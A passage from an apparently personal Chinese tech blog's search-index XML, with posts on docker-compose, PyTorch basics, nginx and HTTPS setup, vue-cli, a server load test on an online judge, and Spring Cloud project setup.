&#125;&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[docker-compose.yml]]></title>
    <url>%2F2019%2F05%2F19%2Fdocker-compose%2F</url>
    <content type="text"><![CDATA[一些docker-compose-yml文件 Nexcus12345678910version: '3'services: nexus: restart: always image: sonatype/nexus3 container_name: nexus ports: - 8081:8081 volumes: - /usr/local/docker/nexus/data:/nexus-data gitlab123456789101112131415161718192021version: '3'services: web: image: 'gitlab/gitlab-ce' restart: always hostname: '120.79.234.127' environment: TZ: 'Asia/Shanghai' GITLAB_OMNIBUS_CONFIG: | external_url 'http://120.79.234.127:8080' gitlab_rails['gitlab_shell_ssh_port'] = 2222 unicorn['port'] = 8888 nginx['listen_port'] = 8080 ports: - '8080:8080' - '8443:443' - '2222:22' volumes: - /root/user/local/docker/gitlab/config:/etc/gitlab - /root/user/local/docker/gitlab/data:/var/opt/gitlab - /root/user/local/docker/gitlab/logs:/var/log/gitlab]]></content>
  </entry>
  <entry>
    <title><![CDATA[服务器压力测试]]></title>
    <url>%2F2019%2F05%2F16%2F%E6%9C%8D%E5%8A%A1%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[对的就是这个，这个就是打开的教程 1. 进入IHT官方博客网站https://www.uscihtoj.com/ 2. 打开OJ网址 3. 注册 只能用电脑，手机大多数是找不到这个的注册之后就直接Login 登陆就行了 4. 点进测试 密码是: ihttest学长学姐直接进去随便找一段代码放进去，疯狂提交就是了持续时间很短，大概疯狂提交2min左右灰常感谢学长学姐的帮忙，很抱歉占用学长学姐的时间哈]]></content>
  </entry>
  <entry>
    <title><![CDATA[Cesium构建项目]]></title>
    <url>%2F2019%2F05%2F14%2FCesium%2F</url>
    <content type="text"><![CDATA[官方链接!()[https://cesium.com/docs/tutorials/getting-started/#your-first-app] 第一个程序 在Apps目录先创建文件 helloWorld.html 模板文件123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;script src="https://cesiumjs.org/releases/1.57/Build/Cesium/Cesium.js"&gt;&lt;/script&gt; &lt;link href="https://cesiumjs.org/releases/1.57/Build/Cesium/Widgets/widgets.css" rel="stylesheet"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="cesiumContainer" style="width: 700px; height:400px"&gt;&lt;/div&gt; &lt;script&gt; Cesium.Ion.defaultAccessToken = 'your_access_token'; var viewer = new Cesium.Viewer('cesiumContainer'); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
  </entry>
  <entry>
    <title><![CDATA[数据加载和预处理]]></title>
    <url>%2F2019%2F04%2F29%2Fpytorch-02-%E6%95%B0%E6%8D%AE%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%92%8C%E9%A2%84%E5%A4%84%E7%90%86%2F</url>
    <content type="text"><![CDATA[pytorm中文手册pytormAPIpytorch官网pytorchCDN加速中文手册 import packagesPyTorch通过torch.utils.data对一般常用的数据加载进行了封装，可以很容易地实现多线程数据预读和批量加载。 并且torchvision已经预先实现了常用图像数据集，包括前面使用过的CIFAR-10，ImageNet、COCO、MNIST、LSUN等数据集，可通过torchvision.datasets方便的调用123import torchfrom torch.utils.data import Datasetimport pandas as pd DatasetDataset是一个抽象类, 为了能够方便的读取，需要将要使用的数据包装为Dataset类。 自定义的Dataset需要继承它并且实现两个成员方法： getitem() 该方法定义用索引(0 到 len(self))获取一条数据或一个样本len() 该方法返回数据集的总长度 代码1234567891011121314151617181920212223#定义一个数据集class BulldozerDataset(Dataset): """ 数据集演示 """ def __init__(self, csv_file): """实现初始化方法，在初始化的时候将数据读载入""" self.df=pd.read_csv(csv_file) def __len__(self): ''' 返回df的长度 ''' return len(self.df) def __getitem__(self, idx): ''' 根据 idx 返回一行数据 ''' return self.df.iloc[idx].SalePrice # 至此，我们的数据集已经定义完成了，我们可以实例话一个对象访问他 ds_demo= BulldozerDataset('median_benchmark.csv') # 实现了 __len__ 方法所以可以直接使用len获取数据总数 len(ds_demo) # 用索引可以直接访问对应的数据, 对应 __getitem__ 方法 ds_demo[0] 数据装载器DataLoader为我们提供了对Dataset的读取操作，常用参数有：batch_size(每个batch的大小), shuffle(是否进行shuffle操作), num_workers(加载数据的时候使用几个子进程)，下面做一个简单的操作12345dl = torch.utils.data.DataLoader(ds_demo, batch_size=10, shuffle=True, num_workers=0)# DataLoader返回的是一个可迭代对象，我们可以使用迭代器分次获取数据idata=iter(dl)print(next(idata)) torchvisiontorchvision 是PyTorch中专门用来处理图像的库torchvision.datasetstorchvision.datasets 可以理解为PyTorch团队自定义的dataset，这些dataset帮我们提前处理好了很多的图片数据集，我们拿来就可以直接使用： · MNIST· COCO· Captions· Detection· LSUN· ImageFolder· Imagenet-12· CIFAR· STL10· SVHN· PhotoTour 我们可以直接使用，示例如下：12345import torchvision.datasets as datasetstrainset = datasets.MNIST(root='./data', # 表示 MNIST 数据的加载的目录 train=True, # 表示是否加载数据库的训练集，false的时候加载测试集 download=True, # 表示是否自动下载 MNIST 数据集 transform=None) # 表示是否需要对数据进行预处理，none为不进行预处理 torchvision.modelstorchvision不仅提供了常用图片数据集，还提供了训练好的模型，可以加载之后，直接使用，或者在进行迁移学习 torchvision.models模块的 子模块中包含以下模型结构。 · AlexNet· VGG· ResNet· SqueezeNet· DenseNet123#我们直接可以使用训练好的模型，当然这个与datasets相同，都是需要从服务器下载的import torchvision.models as modelsresnet18 = models.resnet18(pretrained=True) torchvision.transformsransforms 模块提供了一般的图像转换操作类，用作数据处理和数据增强 12345678from torchvision import transforms as transformstransform = transforms.Compose([ transforms.RandomCrop(32, padding=4), #先四周填充0，在把图像随机裁剪成32*32 transforms.RandomHorizontalFlip(), #图像一半的概率翻转，一半的概率不翻转 transforms.RandomRotation((-45,45)), #随机旋转 transforms.ToTensor(), transforms.Normalize((0.4914, 0.4822, 0.4465), (0.229, 0.224, 0.225)), #R,G,B每层的归一化用到的均值和方差])]]></content>
  </entry>
  <entry>
    <title><![CDATA[神经网络包nn和优化器optm]]></title>
    <url>%2F2019%2F04%2F29%2Fpytorch-01-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%8C%85nn%E5%92%8C%E4%BC%98%E5%8C%96%E5%99%A8optm%2F</url>
    <content type="text"><![CDATA[pytorm中文手册pytormAPIpytorch官网pytorchCDN加速中文手册 相关包引入123import torchimport torch.nn as nnimport torch.nn.functional as F torch.nn是专门为神经网络设计的模块化接口,n构建于 Autograd之上，可用来定义和运行神经网络。 nn.functional，这个包中包含了神经网络中使用的一些常用函数，这些函数的特点是，不具有可学习的参数(如ReLU，pool，DropOut等)，这些函数可以放在构造函数中，也可以不放，但是这里建议不放 定义一个神经网络12345678910111213141516171819202122232425262728293031323334import torchimport torch.nn as nnimport torch.nn.functional as F# 定义一个网络class Net(nn.Module): def __init__(self): super(Net, self).__init__() # 卷积层 '1'表示输入图片为单通道, '6'表示输出通道数，'3'表示卷积核为3*3 self.conv1 = nn.Conv2d(1,6,3) # 线性层，输入1350个特征，输出10个特征 self.fc1 = nn.Linear(1350,10) def forward(self, x): print(x.size()) # 结果：[1, 1, 32, 32] # 卷积 -&gt; 激活 -&gt; 池化 # 卷积的尺寸计算公式后续?? x = F.relu(x) print(x.size()) # 结果：[1, 6, 30, 30] x = F.max_pool2d(x,(2,2)) x = F.relu(x) print(x.size()) # 结果：[1, 6, 15, 15] x = x.view(x.size()[0],-1) # reshape，‘-1’表示自适应 #这里做的就是压扁的操作 就是把后面的[1, 6, 15, 15]压扁，变为 [1, 1350] print(x.size()) x = self.fcl(x) return x ;net = Net()print(net) 结果如下 Net( (conv1): Conv2d(1, 6, kernel_size=(3, 3), stride=(1, 1)) (fc1): Linear(in_features=1350, out_features=10, bias=True)) 返回学习参数12for parameter in net.parameters(): print(parameter) 返回可学习的参数及名称12for name,parameters in net.named_parameters(): print(name,':',parameters.size()) 反向传播 在反向传播前，先要将所有参数的梯度清零 torch.nn只支持mini-batches，不支持一次只输入一个样本，即一次必须是一个batch。12net.zero_grad() out.backward(torch.ones(1,10)) 损失函数12345y = torch.arange(0,10).view(1,10).float()criterion = nn.MSELoss()loss = criterion(out, y)#loss是个scalar，我们可以直接用item获取到他的python类型的数值print(loss.item()) 优化器在反向传播计算完所有参数的梯度后，还需要使用优化方法来更新网络的权重和参数，例如随机梯度下降法(SGD)的更新策略如下： weight = weight - learning_rate * gradient 在torch.optim中实现大多数的优化方法，例如RMSProp、Adam、SGD等，下面我们使用SGD做个简单的样例 导optim包 &amp;&amp; 代码1234567891011121314import torch.optimout = net(input) # 这里调用的时候会打印出我们在forword函数中打印的x的大小criterion = nn.MSELoss()loss = criterion(out, y)#新建一个优化器，SGD只需要要调整的参数和学习率optimizer = torch.optim.SGD(net.parameters(), lr = 0.01)# 先梯度清零(与net.zero_grad()效果一样)optimizer.zero_grad() loss.backward()#更新参数optimizer.step()]]></content>
  </entry>
  <entry>
    <title><![CDATA[Pytorch]]></title>
    <url>%2F2019%2F04%2F19%2Ftest%2F</url>
    <content type="text"><![CDATA[https://github.com/Runindark/Pytorch/blob/master/chapter2/2.1.1.pytorch-basics-tensor.ipynb]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux命令]]></title>
    <url>%2F2019%2F04%2F18%2Flinux-order%2F</url>
    <content type="text"><![CDATA[根据端口杀死进程1sudo fuser -k -n tcp 80]]></content>
  </entry>
  <entry>
    <title><![CDATA[vue-cli]]></title>
    <url>%2F2019%2F04%2F09%2Fvue-cli%2F</url>
    <content type="text"><![CDATA[vue-cli 安装 安装node.js过程略 使用 node -v 可以查看 安装cnpm利用淘宝加速镜像 npm install -g cnpm –registry=http://registry.npm.taobao.org 安装vue-cli手脚架 npm install -g vue-cli 初始化vue-cli项目利用 webpack 打包 vue init webpack myvue 根据提示完成代码运行 cd myvue cnpm install cnpm run dev]]></content>
  </entry>
  <entry>
    <title><![CDATA[资源整合]]></title>
    <url>%2F2019%2F03%2F27%2F%E8%B5%84%E6%BA%90%E6%95%B4%E5%90%88%2F</url>
    <content type="text"><![CDATA[有些很好的帖子或者很好的技术文章都在这里了。 设计模式网址 https://wizardforcel.gitbooks.io/design-pattern-lessons/content/ 学习路线图库移动端 企业级技能 后端学习 https://www.cnblogs.com/huaxingtianxia/p/5724093.html 前端学习 https://github.com/LiangJunrong/document-library/blob/master/other-library/shortArticle/share/November2018.md 游戏(彩蛋) 影狼 https://pan.baidu.com/s/1Mp3b9-D9AJc_0yEbvKV5nA提取码: jzji hacker学习 https://www.ichunqiu.com/ 《网络黑白》《反欺骗的艺术》 梯子 https://repw.github.io/2019/01/20/ssr%E6%90%AD%E5%BB%BA-%E7%A7%91%E5%AD%A6%E7%BF%BB%E5%A2%99/ https://repw.github.io/2019/01/20/ssr搭建-科学翻墙/ 北大学习资料 https://github.com/lib-pku/libpku]]></content>
  </entry>
  <entry>
    <title><![CDATA[ECS踩坑系列之安装nginx]]></title>
    <url>%2F2019%2F03%2F26%2FECS%E9%85%8D%E7%BD%AEnginx%2F</url>
    <content type="text"><![CDATA[url是什么只针对ecs上的nginx，不包含轻量级应用服务器 nginx简介Nginx是一款轻量级的网页服务器、反向代理服务器。相较于Apache、lighttpd具有占有内存少，稳定性高等优势。它最常的用途是提供反向代理服务。 安装过程nginx的启动需要三个包的支持 SSL功能需要openssl库1#yum install openssl gzip模块需要zlib库1#yum install zlib rewrite模块需要pcre库1#yum install pcre 安装Nginx依赖库1#rpm -Uvh http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm 安装nginx1#yum install nginx 启动nginx1#service nginx start 公网地址直接进行访问配置信息CentOS安装Nginx后，安装在了 /etc/nginx/ 目录下，你可以打开 /etc/nginx/conf.d/default/conf 查看里面的配置，包括监听端口，域名和nginx访问的根目录 配置https://www.cnblogs.com/kingsonfu/p/9804131.html nginx常用命令 （ubuntu） 重新载入配置 1# /usr/local/nginx/sbin/nginx -s reload 启动nginx 1# /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf 停用nginx 1# /usr/local/nginx/sbin/nginx -s stop nginx 配置123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146user root;worker_processes 1;#error_log logs/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;#pid logs/nginx.pid;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; #log_format main '$remote_addr - $remote_user [$time_local] "$request" ' # '$status $body_bytes_sent "$http_referer" ' # '"$http_user_agent" "$http_x_forwarded_for"'; #access_log logs/access.log main; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; server &#123; listen 80; server_name localhost; charset utf-8; #charset koi8-r; #access_log logs/host.access.log main; location / &#123; root html; index index.html index.htm; &#125; location /wechat/ &#123; alias /root/local/user/obox/pic/ ; autoindex on ; autoindex_exact_size on; autoindex_localtime on; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \.php$ &#123; # proxy_pass http://127.0.0.1; #&#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # #location ~ \.php$ &#123; # root html; # fastcgi_pass 127.0.0.1:9000; # fastcgi_index index.php; # fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; # include fastcgi_params; #&#125; # deny access to .htaccess files, if Apache's document root # concurs with nginx's one # #location ~ /\.ht &#123; # deny all; #&#125; &#125; # another virtual host using mix of IP-, name-, and port-based configuration # #server &#123; # listen 8000; # listen somename:8080; # server_name somename alias another.alias; # location / &#123; # root html; # index index.html index.htm; # &#125; #&#125; # HTTPS server # server &#123; listen 443; server_name www.net-obox.com net-obox.com; ssl on ; ssl_certificate /root/local/user/nginx/nginx-1.11.3/ssl/2618163_net-obox.com.pem; ssl_certificate_key /root/local/user/nginx/nginx-1.11.3/ssl/2618163_net-obox.com.key; ssl_session_cache shared:SSL:1m; ssl_session_timeout 5m; #设置长连接 keepalive_timeout 70; #减少点击劫持 add_header X-Frame-Options DENY; #禁止服务器自动解析资源类型 add_header X-Content-Type-Options nosniff; #防XSS攻击 add_header X-Xss-Protection 1; ssl_ciphers HIGH:!aNULL:!MD5; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; location / &#123; root html; index index.html index.htm; proxy_pass http://118.31.120.92:8080; &#125; &#125; server &#123; listen 80; server_name www.net-obox.com net-obox.com; #核心代码 return 301 https://$server_name$request_uri; &#125;&#125;]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F03%2F25%2Fdocker%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[SpringCloud-Netflix-03-个人理解]]></title>
    <url>%2F2019%2F03%2F25%2FSpringCloud-Netflix-03-%E4%B8%AA%E4%BA%BA%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[说在前面的话经理了spring cloud的微服务的学习之后，还是有很多感悟的，毕竟从最开始的JavaEE ，SSM ，SpringBoot ， Springcloud算是把javaWeb的学习走到了尽头，对web的理解也算是颇有感悟。 Web的学习永远是颠覆你大爷的自学过程学习JavaWeb这部分的东西可以说是我自学路上的最可怕的过程，由于同时学习这个东西的人数着实比较少，感觉心里很没底，但是因为一头扎入团队中，也就是硬着头皮学习了，不幸，由于对从基层的基础语法到高层的架构项目实现，演进速度过快，导致我自己的思维无法跟上这一个转变，所以中间的一个空缺期是一个让我特别头大的过程，致使我无法把架构类的东西直接采用拿来主义快速投入使用，好在笨鸟先飞，这让我对web这一套花里胡哨的东西有了对底层的理解。所以总而言之，误打误撞也是以一个正确的姿势入了门。 何为web其实说起java web其实更准确的说是web后端，说的再明白一些其实是数据处理部分，是的，这不是网页那种花里胡哨的东西，很尴尬这里是完完全全的逻辑实现，完完整整的MVC思路的深入，直到你觉得mvc不再是刻意设计模式，而是顺理成章的开发思路。 为什么是颠覆？塑料段位说来都是痛苦，首先JavaEE学完了，servlet，generalservlet，httpservlet，jsp，el，过滤器，拦截器，再到建包模型，从接口道impi实例，当我学完的那一个瞬间，我以为我是个王者，结果，我才晋升到了塑料。 学习内容概述javaEE 可以是说是一切的基础了，后面的使用框架其实是简单的，反而最繁杂的东西是javaEE部分，各种接口，内置对象的东西，彼此关联但是也彼此分离。 servlet简单的理解，servlet其实就是一个小型的服务器，类似内置的在javaEE内部的一个小型的servlet 烂铁段位然后开始学习ssm，这是我生命中接触框架，一次就解除了三个，真好，然后开始了，xml，yml，propeities，maven，webapp开始层出不穷，开始我真的不知道maven是个什么鬼东西，就是觉得那些图标一出来牛逼的要死，直到后来我知道了这是个jar包的自动管理，xml就是个仿html的配置文档，yml是仿md的，propertis就是正常的语法配置，说道理，这一大堆就是用来注册的，保证你所需要的中间件可以注册道sprinbg 的容器之中，来保证你的所有使用都加入到框架的结构中，祝你开发更加简单，emmm，不得不说哈，我想起了某学长的一句很经典的话“框架就是让你的开发更加复杂，但是你又不得不用的东西”，是这样没错了。还行，我又头铁的学完了。从建立模型到成立，到数据持久化。总算是学完了，真好，我以为我是个王者，其实是个兰铁片。 黑铁段位了之后，开始进入了springboot学习阶段，是的，springboot的自动装配原理，导致我们的开发之路更加简单了，所有东西只要有注解什么都好，整合了绝大多数的驱动，比如 日志，模板，持久层，安全部分。庞大的信息量让人眼花缭乱，太多的选择让人绝望，不过确实，相比ssm，springboot真的是太简单了。简单的让人无法呼吸。 好了，从烂铁，到了黑铁了，冷静，还是铁。 入门了，青铜springcloud的学习其实才是真正的开发的启示，gitlab，服务机制，流量，高并发，高可用这才开始了我们真正对云端项目进行思考，容器的使用等，真的，你会发现其实之前学的真的只是冰山一角，那个只是解决了数据从前台到后台的方法，但是docker，docker-compose的学习这才是开始了我们对一个大型web项目的思考，当然还有没有学习的nexus，还有持续集成等等这些，这才是我们要整合的技能，我们对web的开眼其实这才开始。 归行合一大道之行，大道合一。目前主流技术，大数据，区块链，人工智能。看似是分立的东西。其实是一样的根源于互联网。公司发展分4步走，第一步web开发，前台后台微服务架构一起开发，项目上线准备赚钱。第二部，精准赚钱。大数据开始上线，统筹协同用户数据，实现个性化发展，分析用户需求，实现精准推荐。第三阶段，大数据加人工智能。人工智能是对管理和数据体系的智能化解决方案，不止是大家看到的机器人，公司规模扩大，势必有大量数据管理问题，人工智障发挥用途。第四步，区块链，区块链核心在于去中心化，链圈构建超级计算器，所谓超级计算器，就是世界各个地方服务器链接一起，构成超级的数据处理，其实我这觉得有点像是被植入木马挖矿。 这才是我们当今世界的样子，所谓的热门技术，都是一步步累计的，我这才知道学习这才是开始，相对于每天不知所以跟着老师按部就班，我可能更喜欢站在浪潮中看世界，现在我看到的世界就是这个样子，真的很宏观，很伟大，这也使得我对《浪潮之巅》这本书更加的敬佩。 雷军言：“站在风口上，猪也能飞起来”马云言：“站在风口上，飞起来的猪摔死的也更惨”]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringCloud-Netflix-02-创建项目]]></title>
    <url>%2F2019%2F03%2F23%2FSpringCloud-Netflix-02-%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[说在前面的话微服务是面向工程创建起来的，那么微服务项目的创建当然是重头戏，springcloud是完全基于Springboot建立起来的，如果说没弄明白spingboot也就不需要学习springcloud了。 创建统一依赖管理在根目录下创建 Dictionary hello-spring-cloud-dependencies 创建pom.xml配置文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;!--springboot配置--&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt; &lt;/parent&gt; &lt;!--项目目录 网站反写--&gt; &lt;groupId&gt;com.runindark&lt;/groupId&gt; &lt;artifactId&gt;hello-spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;1.0.0-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;pom&lt;/packaging&gt; &lt;!--项目名称注册--&gt; &lt;name&gt;hello-spring-cloud-dependencies&lt;/name&gt; &lt;url&gt;http://www.runindark.com&lt;/url&gt; &lt;inceptionYear&gt;2018-Now&lt;/inceptionYear&gt; &lt;properties&gt; &lt;!-- Environment Settings --&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;!-- Spring Settings --&gt; &lt;spring-cloud.version&gt;Finchley.RELEASE&lt;/spring-cloud.version&gt; &lt;/properties&gt; &lt;!-- 版本控制 否则无法找到主类--&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt; &lt;build&gt; &lt;plugins&gt; &lt;!-- Compiler 插件, 设定 JDK 版本 --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;showWarnings&gt;true&lt;/showWarnings&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;!-- 打包 jar 文件时，配置 manifest 文件，加入 lib 包的 jar 依赖 --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;archive&gt; &lt;addMavenDescriptor&gt;false&lt;/addMavenDescriptor&gt; &lt;/archive&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;configuration&gt; &lt;archive&gt; &lt;manifest&gt; &lt;!-- Add directory entries --&gt; &lt;addDefaultImplementationEntries&gt;true&lt;/addDefaultImplementationEntries&gt; &lt;addDefaultSpecificationEntries&gt;true&lt;/addDefaultSpecificationEntries&gt; &lt;addClasspath&gt;true&lt;/addClasspath&gt; &lt;/manifest&gt; &lt;/archive&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;!-- resource --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;!-- install --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-install-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;!-- clean --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-clean-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;!-- ant --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-antrun-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;!-- dependency --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;pluginManagement&gt; &lt;plugins&gt; &lt;!-- Java Document Generate --&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-javadoc-plugin&lt;/artifactId&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;prepare-package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;jar&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;!-- YUI Compressor (CSS/JS压缩) --&gt; &lt;plugin&gt; &lt;groupId&gt;net.alchim31.maven&lt;/groupId&gt; &lt;artifactId&gt;yuicompressor-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.5.1&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;phase&gt;prepare-package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;compress&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;configuration&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;jswarn&gt;false&lt;/jswarn&gt; &lt;nosuffix&gt;true&lt;/nosuffix&gt; &lt;linebreakpos&gt;30000&lt;/linebreakpos&gt; &lt;force&gt;true&lt;/force&gt; &lt;includes&gt; &lt;include&gt;**/*.js&lt;/include&gt; &lt;include&gt;**/*.css&lt;/include&gt; &lt;/includes&gt; &lt;excludes&gt; &lt;exclude&gt;**/*.min.js&lt;/exclude&gt; &lt;exclude&gt;**/*.min.css&lt;/exclude&gt; &lt;/excludes&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/pluginManagement&gt; &lt;!-- 资源文件配置 --&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;excludes&gt; &lt;exclude&gt;**/*.java&lt;/exclude&gt; &lt;/excludes&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;/build&gt; &lt;!--配置仓库--&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;aliyun-repos&lt;/id&gt; &lt;name&gt;Aliyun Repository&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;repository&gt; &lt;id&gt;sonatype-repos&lt;/id&gt; &lt;name&gt;Sonatype Repository&lt;/name&gt; &lt;url&gt;https://oss.sonatype.org/content/groups/public&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;repository&gt; &lt;id&gt;sonatype-repos-s&lt;/id&gt; &lt;name&gt;Sonatype Repository&lt;/name&gt; &lt;url&gt;https://oss.sonatype.org/content/repositories/snapshots&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;repository&gt; &lt;id&gt;spring-snapshots&lt;/id&gt; &lt;name&gt;Spring Snapshots&lt;/name&gt; &lt;url&gt;https://repo.spring.io/snapshot&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;pluginRepositories&gt; &lt;pluginRepository&gt; &lt;id&gt;aliyun-repos&lt;/id&gt; &lt;name&gt;Aliyun Repository&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/pluginRepository&gt; &lt;/pluginRepositories&gt;&lt;/project&gt; maven管理pom.xml文件 设置项目工程jdk 第一步第二步 服务注册与发现创建Dictionary hello-spring-cloud-eureka 创建文件目录 如图 创建pom.xml配置文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; 